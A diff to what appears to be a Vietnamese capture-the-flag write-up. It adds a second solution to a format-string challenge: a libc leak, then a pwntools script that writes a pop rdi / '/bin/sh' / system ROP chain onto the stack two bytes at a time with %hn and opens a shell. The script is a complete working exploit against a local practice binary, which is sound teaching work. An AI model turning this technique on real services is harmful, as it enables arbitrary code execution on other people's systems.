@@ -107,9 +107,11 @@ Tính địa chỉ gadget:
 gadget_offset = 0xddf43
 gadget = libc.address + gadget_offset
 ```
-ta sẽ sử dụng format string `%n` với `fmtstr_payload` để overwrite gadget vào return address
+ta sẽ sử dụng format string `%n` để overwrite vào địa chỉ trên rip và sau nó 
 
 và overwrite từng 2 byte một vào return address qua mỗi vòng while (vì viết hết vào thì rất lớn)
+
+**C1: one_gadget**
 ```python
 i: 1 -> 3
 
@@ -226,6 +228,90 @@ p.interactive()
 
 ```
 
+**C2: ROP chain**
+
+Vì ta đã có libc base, ta cũng có thể tạo ROP chain và overwrite với format string `%n` từ `rip` đổ lên:
+
+Stack từ rip trông như sau:
+```
+# [ret_addr + 0 ] : pop_rdi
+# [ret_addr + 8 ] : bin_sh
+# [ret_addr + 16] : ret  
+# [ret_addr + 24] : system
+```
+* lấy từng gadget trong chain
+* chia nhỏ ra làm 2 bytes một
+* và overwrite từng đấy byte vào memory block 8-byte
+* cuối cùng "quit" để `rsp` -> `rip` trỏ và thực thi payload
+
+<img width="800" height="584" alt="pop rdi2" src="https://github.com/user-attachments/assets/af53bf7a-c5a7-49fa-8465-8867a93b5ea6" />
+
+<img width="800" height="584" alt="pop rdi2" src="https://github.com/user-attachments/assets/d5ee38a8-48f5-4de0-8b0a-f7f0df64b3bc" />
+
+
+Script:
+```python
+from pwn import *
+
+exe = context.binary = ELF('./chall', checksec=False)
+libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
+context.log_level = 'info'
+
+def GDB():
+    gdb.attach(p, gdbscript='''
+    br *main + 38
+    br *main + 53
+
+    x/20gx $rsp
+    tel
+    ''')
+
+p = process(exe.path)
+GDB()
+
+# leak (fmtstr)
+p.sendline(b'%3$p %15$p')
+datas = p.recvline().split()
+buffer_leak = int(datas[0], 16)
+libc_leak   = int(datas[1], 16)
+
+libc.address = libc_leak - 0x29ca8 
+log.success(f"Libc Base: {hex(libc.address)}")
+
+# rop exploit
+rop = ROP(libc)
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0] 
+ret_gadget = rop.find_gadget(['ret'])[0]         
+system_addr = libc.symbols['system']
+bin_sh_addr = next(libc.search(b'/bin/sh'))
+
+log.info(f"pop_rdi: {hex(pop_rdi)}")
+log.info(f"bin_sh : {hex(bin_sh_addr)}")
+
+chain = [pop_rdi, bin_sh_addr, ret_gadget, system_addr]
+
+ret_addr = buffer_leak + 0x48
+
+# overwrite stack
+for i, rop_gad in enumerate(chain):
+    addr_block = ret_addr + (i * 8)
+    
+    for j in range(3):
+        part = (rop_gad >> (16 * j)) & 0xffff
+        position = addr_block + (j * 2)
+        
+        payload = f'%{part}c%8$hn'.encode()
+        payload = payload.ljust(16, b'A') 
+        payload += p64(position)
+        
+        p.sendline(payload)
+        p.clean(timeout=0.1)
+
+# quit
+p.sendline(b'quit') 
+
+p.interactive()
+```
 
 
 
